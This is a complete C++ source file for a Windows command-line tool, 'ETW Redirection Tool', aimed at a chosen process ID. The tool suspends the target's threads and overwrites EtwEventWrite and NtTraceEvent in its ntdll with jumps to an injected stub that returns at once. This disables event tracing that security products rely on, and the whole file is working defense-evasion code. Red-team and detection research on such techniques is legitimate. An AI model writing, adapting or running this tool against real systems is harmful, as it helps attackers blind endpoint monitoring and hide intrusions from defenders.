#include <Windows.h>
#include <winternl.h>
#include <iostream>
#include <string>
#include <vector>
#include <TlHelp32.h>
#include <Psapi.h>
#include <sstream>
#include <iomanip>
#include <conio.h>

#pragma comment(lib, "ntdll.lib")

typedef struct _MY_CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} MY_CLIENT_ID, * PMY_CLIENT_ID;

extern "C" NTSTATUS NTAPI NtAllocateVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID* BaseAddress,
    _In_ ULONG_PTR ZeroBits,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG AllocationType,
    _In_ ULONG Protect
);

extern "C" NTSTATUS NTAPI NtProtectVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID* BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG NewProtect,
    _Out_ PULONG OldProtect
);

extern "C" NTSTATUS NTAPI NtWriteVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _In_ PVOID Buffer,
    _In_ SIZE_T NumberOfBytesToWrite,
    _Out_opt_ PSIZE_T NumberOfBytesWritten
);

extern "C" NTSTATUS NTAPI NtReadVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _Out_ PVOID Buffer,
    _In_ SIZE_T BufferSize,
    _Out_opt_ PSIZE_T NumberOfBytesRead
);

extern "C" NTSTATUS NTAPI NtResumeThread(
    _In_ HANDLE ThreadHandle,
    _Out_opt_ PULONG PreviousSuspendCount
);

extern "C" NTSTATUS NTAPI NtSuspendThread(
    _In_ HANDLE ThreadHandle,
    _Out_opt_ PULONG PreviousSuspendCount
);

extern "C" NTSTATUS NTAPI NtOpenThread(
    _Out_ PHANDLE ThreadHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ PMY_CLIENT_ID ClientId
);

extern "C" NTSTATUS NTAPI NtTraceEvent(
    _In_ HANDLE TraceHandle,
    _In_ ULONG Flags,
    _In_ ULONG FieldSize,
    _In_ PVOID Fields
);

class Logger {
private:
    bool m_debugEnabled;

public:
    Logger(bool debugEnabled = false) : m_debugEnabled(debugEnabled) {}

    void setDebugEnabled(bool enabled) {
        m_debugEnabled = enabled;
    }

    void debug(const std::string& message) {
        if (m_debugEnabled) {
            std::cout << "[DEBUG] " << message << std::endl;
        }
    }

    void info(const std::string& message) {
        std::cout << "[+] " << message << std::endl;
    }

    void error(const std::string& message) {
        std::cerr << "[-] " << message << std::endl;
    }

    std::string formatHex(PVOID ptr) {
        std::stringstream ss;
        ss << "0x" << std::hex << std::setw(16) << std::setfill('0') << (ULONG_PTR)ptr;
        return ss.str();
    }

    std::string formatStatus(NTSTATUS status) {
        std::stringstream ss;
        ss << "0x" << std::hex << std::setw(8) << std::setfill('0') << status;
        return ss.str();
    }
};

class EtwBypass {
private:
    struct EtwFunction {
        std::string name;
        PVOID address;
        PVOID hookAddress;
        std::vector<unsigned char> originalBytes;
    };

    DWORD m_processId;
    HANDLE m_processHandle;
    std::vector<HANDLE> m_threadHandles;
    Logger m_logger;
    bool m_verbose;
    bool m_pause;
    std::vector<EtwFunction> m_etwFunctions;

    BOOL GetProcessThreads(DWORD processId, std::vector<DWORD>& threadIds) {
        HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (hThreadSnap == INVALID_HANDLE_VALUE) {
            m_logger.error("Failed to create thread snapshot. Error: " + std::to_string(GetLastError()));
            return FALSE;
        }

        THREADENTRY32 te32;
        te32.dwSize = sizeof(THREADENTRY32);

        if (!Thread32First(hThreadSnap, &te32)) {
            m_logger.error("Failed to get first thread. Error: " + std::to_string(GetLastError()));
            CloseHandle(hThreadSnap);
            return FALSE;
        }

        do {
            if (te32.th32OwnerProcessID == processId) {
                threadIds.push_back(te32.th32ThreadID);
                m_logger.debug("Found thread ID: " + std::to_string(te32.th32ThreadID));
            }
        } while (Thread32Next(hThreadSnap, &te32));

        CloseHandle(hThreadSnap);
        return TRUE;
    }

    BOOL SuspendAllThreads() {
        std::vector<DWORD> threadIds;
        if (!GetProcessThreads(m_processId, threadIds)) {
            m_logger.error("Failed to enumerate process threads");
            return FALSE;
        }

        for (DWORD threadId : threadIds) {
            if (threadId == GetCurrentThreadId()) continue;

            HANDLE hThread = NULL;
            OBJECT_ATTRIBUTES oa = { sizeof(OBJECT_ATTRIBUTES) };
            MY_CLIENT_ID cid = { 0 };
            cid.UniqueProcess = (HANDLE)(ULONG_PTR)m_processId;
            cid.UniqueThread = (HANDLE)(ULONG_PTR)threadId;

            NTSTATUS status = NtOpenThread(
                &hThread,
                THREAD_SUSPEND_RESUME,
                &oa,
                &cid
            );

            if (NT_SUCCESS(status)) {
                ULONG previousCount = 0;
                status = NtSuspendThread(hThread, &previousCount);
                if (NT_SUCCESS(status)) {
                    m_threadHandles.push_back(hThread);
                    m_logger.debug("Suspended thread ID: " + std::to_string(threadId));
                }
                else {
                    CloseHandle(hThread);
                }
            }
        }

        m_logger.info("Suspended " + std::to_string(m_threadHandles.size()) + " threads");
        return m_threadHandles.size() > 0;
    }

    BOOL ResumeAllThreads() {
        BOOL result = TRUE;
        for (HANDLE hThread : m_threadHandles) {
            ULONG previousCount = 0;
            NtResumeThread(hThread, &previousCount);
            CloseHandle(hThread);
        }
        m_threadHandles.clear();
        return result;
    }

    PVOID FindFunctionAddress(const char* functionName) {
        HMODULE hMods[1024];
        DWORD cbNeeded;
        if (!EnumProcessModules(m_processHandle, hMods, sizeof(hMods), &cbNeeded)) {
            return NULL;
        }

        HMODULE ntdllModule = NULL;
        for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
            CHAR szModName[MAX_PATH];
            if (GetModuleFileNameExA(m_processHandle, hMods[i], szModName, sizeof(szModName))) {
                if (strstr(szModName, "ntdll.dll") != NULL) {
                    ntdllModule = hMods[i];
                    break;
                }
            }
        }

        if (!ntdllModule) {
            return NULL;
        }

        MODULEINFO mi;
        if (!GetModuleInformation(m_processHandle, ntdllModule, &mi, sizeof(mi))) {
            return NULL;
        }

        HMODULE hNtdll = LoadLibraryA("ntdll.dll");
        if (!hNtdll) {
            return NULL;
        }

        PVOID localFunction = GetProcAddress(hNtdll, functionName);
        if (!localFunction) {
            FreeLibrary(hNtdll);
            return NULL;
        }

        PVOID localNtdllBase = (PVOID)hNtdll;
        SIZE_T offset = (SIZE_T)localFunction - (SIZE_T)localNtdllBase;
        PVOID remoteFunction = (PVOID)((SIZE_T)mi.lpBaseOfDll + offset);

        FreeLibrary(hNtdll);
        return remoteFunction;
    }

    BOOL InitializeEtwFunctions() {
        const char* functionNames[] = {
            "EtwEventWrite",
            "NtTraceEvent"
        };

        for (const char* functionName : functionNames) {
            PVOID functionAddr = FindFunctionAddress(functionName);
            if (functionAddr) {
                EtwFunction func = { functionName, functionAddr, NULL };
                m_etwFunctions.push_back(func);
                m_logger.info("Found " + std::string(functionName) + " at " + m_logger.formatHex(functionAddr));
            }
        }

        return !m_etwFunctions.empty();
    }

    void PrintMemoryBytes(PVOID address, SIZE_T size) {
        std::vector<unsigned char> buffer(size);
        SIZE_T bytesRead = 0;
        
        NTSTATUS status = NtReadVirtualMemory(
            m_processHandle,
            address,
            buffer.data(),
            size,
            &bytesRead
        );

        if (NT_SUCCESS(status) && bytesRead == size) {
            std::stringstream ss;
            ss << "Memory at " << m_logger.formatHex(address) << ":" << std::endl;
            
            for (SIZE_T i = 0; i < size; i++) {
                ss << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(buffer[i]) << " ";
                if ((i + 1) % 16 == 0) ss << std::endl;
            }
            m_logger.info(ss.str());
        }
    }

    BOOL HookFunction(EtwFunction& func) {
        if (m_verbose) {
            PrintMemoryBytes(func.address, 16);
        }

        unsigned char etwBypass[] = {
            0x48, 0x33, 0xC0,// xor rax, rax
            0x48, 0xFF, 0xC0,//inc rax 
            0xC3//ret
        };

        func.originalBytes.resize(sizeof(etwBypass));
        SIZE_T bytesRead = 0;
        NTSTATUS status = NtReadVirtualMemory(
            m_processHandle,
            func.address,
            func.originalBytes.data(),
            func.originalBytes.size(),
            &bytesRead
        );

        if (!NT_SUCCESS(status)) {
            return FALSE;
        }

        PVOID remoteMemory = NULL;
        SIZE_T regionSize = sizeof(etwBypass);
        status = NtAllocateVirtualMemory(
            m_processHandle,
            &remoteMemory,
            0,
            &regionSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );

        if (!NT_SUCCESS(status)) {
            return FALSE;
        }

        SIZE_T bytesWritten = 0;
        status = NtWriteVirtualMemory(
            m_processHandle,
            remoteMemory,
            etwBypass,
            sizeof(etwBypass),
            &bytesWritten
        );

        if (!NT_SUCCESS(status) || bytesWritten != sizeof(etwBypass)) {
            return FALSE;
        }

        if (m_verbose) {
            PrintMemoryBytes(remoteMemory, sizeof(etwBypass));
        }

        ULONG oldProtect = 0;
        status = NtProtectVirtualMemory(
            m_processHandle,
            &remoteMemory,
            &regionSize,
            PAGE_EXECUTE_READ,
            &oldProtect
        );

        if (!NT_SUCCESS(status)) {
            return FALSE;
        }

        unsigned char jumpBytes[14] = { 0 };
        jumpBytes[0] = 0x48;  // mov rax, <addr>
        jumpBytes[1] = 0xB8;
        *(PVOID*)(&jumpBytes[2]) = remoteMemory;
        jumpBytes[10] = 0xFF;  // jmp rax
        jumpBytes[11] = 0xE0;
        jumpBytes[12] = 0xCC;  // int3 (padding)
        jumpBytes[13] = 0xCC;  // int3 (padding)

        PVOID targetAddr = func.address;
        regionSize = sizeof(jumpBytes);
        status = NtProtectVirtualMemory(
            m_processHandle,
            &targetAddr,
            &regionSize,
            PAGE_READWRITE,
            &oldProtect
        );

        if (!NT_SUCCESS(status)) {
            return FALSE;
        }

        status = NtWriteVirtualMemory(
            m_processHandle,
            func.address,
            jumpBytes,
            sizeof(jumpBytes),
            &bytesWritten
        );

        if (!NT_SUCCESS(status) || bytesWritten != sizeof(jumpBytes)) {
            return FALSE;
        }

        if (m_verbose) {
            PrintMemoryBytes(func.address, sizeof(jumpBytes));
        }

        status = NtProtectVirtualMemory(
            m_processHandle,
            &targetAddr,
            &regionSize,
            oldProtect,
            &oldProtect
        );

        if (!NT_SUCCESS(status)) {
            return FALSE;
        }

        func.hookAddress = remoteMemory;
        return TRUE;
    }

public:
    EtwBypass(DWORD processId, bool verbose = false, bool pause = false) :
        m_processId(processId),
        m_processHandle(NULL),
        m_verbose(verbose),
        m_pause(pause) {
        m_logger.setDebugEnabled(verbose);
    }

    ~EtwBypass() {
        if (m_processHandle) {
            CloseHandle(m_processHandle);
        }
        ResumeAllThreads();
    }

    BOOL Execute() {
        m_logger.info("Targeting process with PID: " + std::to_string(m_processId));

        m_processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, m_processId);
        if (!m_processHandle) {
            m_logger.error("Failed to open process");
            return FALSE;
        }

        if (!SuspendAllThreads()) {
            m_logger.error("Failed to suspend threads");
            CloseHandle(m_processHandle);
            return FALSE;
        }

        if (!InitializeEtwFunctions()) {
            m_logger.error("Failed to initialize ETW functions");
            ResumeAllThreads();
            CloseHandle(m_processHandle);
            return FALSE;
        }

        bool allSuccess = true;
        for (auto& func : m_etwFunctions) {
            if (!HookFunction(func)) {
                m_logger.error("Failed to hook " + func.name);
                allSuccess = false;
            }
            else {
                m_logger.info("Successfully hooked " + func.name);
            }
        }

        if (!ResumeAllThreads()) {
            m_logger.error("Failed to resume threads");
            CloseHandle(m_processHandle);
            return FALSE;
        }

        return allSuccess;
    }
};

void PrintBanner() {
    std::cout << "\n==================================================" << std::endl;
    std::cout << "      ETW Redirection Tool      " << std::endl;
    std::cout << "==================================================" << std::endl;
}

int main(int argc, char* argv[]) {
    PrintBanner();

    bool verbose = false;
    DWORD pid = 0;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-v") == 0 || strcmp(argv[i], "--verbose") == 0) {
            verbose = true;
        }
        else if (isdigit(argv[i][0])) {
            pid = atoi(argv[i]);
        }
        else if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            std::cout << "\nUsage: " << argv[0] << " <PID> [-v|--verbose]" << std::endl;
            return 0;
        }
    }

    if (pid <= 0) {
        std::cerr << "[-] Invalid or missing PID" << std::endl;
        std::cout << "\nUsage: " << argv[0] << " <PID> [-v|--verbose]" << std::endl;
        return 1;
    }

    EtwBypass bypass(pid, verbose);
    if (bypass.Execute()) {
        std::cout << "[+] Successfully bypassed ETW in process " << pid << std::endl;
        return 0;
    }
    else {
        std::cerr << "[-] Failed to bypass ETW in process " << pid << std::endl;
        return 1;
    }
}
